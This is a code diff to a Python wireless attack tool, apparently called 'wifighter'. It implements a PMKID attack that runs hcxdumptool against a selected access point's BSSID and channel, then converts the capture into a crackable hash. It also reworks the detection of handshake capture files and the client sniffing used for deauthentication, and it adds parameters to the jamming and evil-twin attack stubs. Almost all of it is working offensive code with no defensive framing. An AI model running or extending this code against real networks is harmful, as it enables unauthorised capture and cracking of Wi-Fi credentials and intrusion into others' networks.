@@ -91,7 +91,16 @@ def create_cap_dir(target, output_dir):
 def create_dir(path):
      if not os.path.exists(path):
           os.system(f'mkdir -p {path}')
-        
+
+# Determine handshake capture file
+def list_files(directory): 
+     return set(os.listdir(directory))
+def cap_file(files_before, files_after, keyword):
+     new_files = files_after - files_before
+
+     for filename in new_files:
+          if keyword in filename:
+               return filename
 
 def generate_report(attack, target_ap, crack, target, output_dir):
      current_time = datetime.now()
@@ -615,7 +624,7 @@ def sniff_clients(interface, target_ap, target):
 
                     elif pkt.addr1 == target_ap and pkt.addr2 not in clients:
                          # Check if not one of the standardized MAC addresses
-                         if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs):
+                         if not any(pkt.addr2.startswith(mac) for mac in standardized_MACs):
                               #print(f'1 {pkt.addr1} = {target_ap}, | {pkt.addr2} |')
                               clients.append(pkt.addr2)
 
@@ -713,17 +722,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                try:
                     target_client = choose_target_client(sniffed_clients)
                except:
-                    pass
-
-     # Determine handshake capture file
-     def list_files(directory): 
-          return set(os.listdir(directory))
-     def cap_file(files_before, files_after):
-          new_files = files_after - files_before
-
-          for filename in new_files:
-               if '.cap' in filename:
-                    return filename       
+                    pass       
 
      # Kill airodump processes after capturing handshake
      def kill_airodump_processes():
@@ -806,7 +805,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
           deauth_clients.join() # Wait for the process to stop
 
      files_after = list_files(output_dir) # Get files after airodump-ng adds new
-     output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores
+     output_file = cap_file(files_before, files_after, 'handshake') # Determine output_file in which airodump-ng stores
 
      # Wait and verify that handshake was captured successfuly
      captured = False
@@ -873,8 +872,89 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
 
 
 # | PMKID ATTACK | #
-def pmkid_attack(target_ap, interface):
-     print('PMKID ATTACK...')
+def pmkid_attack(target_ap, interface, target):
+     global wifighter_path, output_dir, output_file, delete_capture
+
+     # Prepare variables
+     ssid = target_ap['SSID'] if target_ap['SSID'] else None
+     bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
+     channel = target_ap['Channel'] if target_ap['Channel'] else None
+     wordlist = None
+     password = None
+
+     # Define output dir for handshakes
+     output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"
+
+     # Run airodump-ng
+     def run_hcxdumptool(interface, bssid, channel, output_dir):
+          if interface and bssid and channel and output_dir:
+               try:
+                    command = ['sudo', 'hcxdumptool', '-o', f'{output_dir}/pmkid_capture.pcapng', '-i', interface, '-c', channel, '--enable_status=3', '--filtermode=2', f'--filterlist_ap={bssid}']
+                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+               except:
+                    pass
+
+
+     logo()
+     print(f'{CYAN}| PMKID Attack |{RESET}\n')
+     if ssid:
+          print(f'Attacking on {ssid} ({bssid}) with {interface}...')
+     else:
+          print(f'Attacking on {bssid} with {interface}...')
+
+
+     create_cap_dir(target, output_dir) # Create capture dir if not exist
+
+     # Handle cases where handshake cracking not possible
+     if target_ap['Encryption'] == 'Open/Unknown':
+          print(f"\n{YELLOW}!! This is either Open network or the encryption type wasn't recognized correctly !! Skipping...{RESET}")
+          return
+     elif target_ap['Encryption'] == 'WPA3' or target_ap['Auth'] == 'IEEE 802.1X':
+          print(f"\n{YELLOW}!! WPA3 protected or Enterprise authenticated networks aren't vulnerable to this type of attack !! Skipping...{RESET}")
+          return
+
+     # Define processes
+     capture_pmkid = multiprocessing.Process(target = run_hcxdumptool, args=(interface, bssid, channel, output_dir))
+
+     files_before = list_files(output_dir) # Get files before airodump-ng adds new
+
+     # Listen for handshake
+     capture_pmkid.start() # Start airodump-ng process
+     delete_capture = True
+     time.sleep(2)
+
+     files_after = list_files(output_dir) # Get files after airodump-ng adds new
+     output_file = cap_file(files_before, files_after, 'pmkid_capture') # Determine output_file in which airodump-ng stores
+     file_num = output_file.split('-')[1]
+     
+     # Wait and verify that handshake was captured successfuly
+     captured = False
+     print(f"{CYAN}[>]{RESET} Waiting for PMKID...")
+     while not captured:
+          if os.path.exists(f"{output_dir}/{output_file}"):
+               try:
+                    # !! If no EAPOLs caught no pmkid_hash file will be created !!
+                    command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash-{file_num}', f'{output_dir}/{output_file}']
+                    verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                    output = str(verify.communicate())
+                    #print(output)
+               except:
+                    pass
+               # Extract the caught PMKID's number value
+               pmkid_pattern = r'RSN PMKID \(total\).*?: (\d+)'
+               pmkid_match = re.search(pmkid_pattern, output) # Search for the pattern in the output string
+               if pmkid_match:
+                    pmkid = pmkid_match.group(1)
+                    #print(pmkid)
+                    if int(pmkid) > 0:
+                         print(f"{CYAN}[>]{RESET}{pmkid} PMKID/s captured!")
+                         captured = True
+
+          time.sleep(5)
+
+     delete_capture = False
+     # Kill hcxdumptool process
+     capture_pmkid.terminate()
 
 
 
@@ -954,7 +1034,7 @@ def jam_network(target_ap, interface, jammer_mode):
 
 
 # | Evil Twin | #
-def evil_twin(target_ap, interface, twin_mode):
+def evil_twin(target_ap, interface, twin_mode, target):
      print(f'EVIL TWIN ATTACK... MODE: {twin_mode}')
 
 
@@ -1015,8 +1095,11 @@ else:
 
      # Scan and choose target AP
      if interface:
-          monitor_switch(None, 'stop', interface, None) # Make sure interface is in Managed
-          start_services(None) # Make sure network services are running
+          try:
+               monitor_switch(None, 'stop', interface, None) # Make sure interface is in Managed
+               start_services(None) # Make sure network services are running
+          except KeyboardInterrupt:
+               pass
           try:
                while True:
                     # Get available AP's
@@ -1043,8 +1126,14 @@ else:
      
      # Run attacks
      if attack:
-          monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
-          time.sleep(1.5)
+          try:
+               monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
+          except KeyboardInterrupt:
+               pass
+          try:
+               time.sleep(2)
+          except KeyboardInterrupt:
+               pass
           target = target_ap['SSID'] if target_ap['SSID'] else target_ap['BSSID'] # Set target by checking if SSID set
           logo()
           if attack == 'Handshake Crack':
@@ -1059,7 +1148,7 @@ else:
 
           elif attack == 'PMKID Attack':
                try:
-                    pmkid_attack(target_ap, interface)
+                    pmkid_attack(target_ap, interface, target)
                except:
                     pass
 
@@ -1075,7 +1164,7 @@ else:
                twin_mode = choose_twin_mode()
                if twin_mode:
                     try:
-                         evil_twin(target_ap, interface, twin_mode)
+                         evil_twin(target_ap, interface, twin_mode, target)
                     except KeyboardInterrupt:
                          pass
 
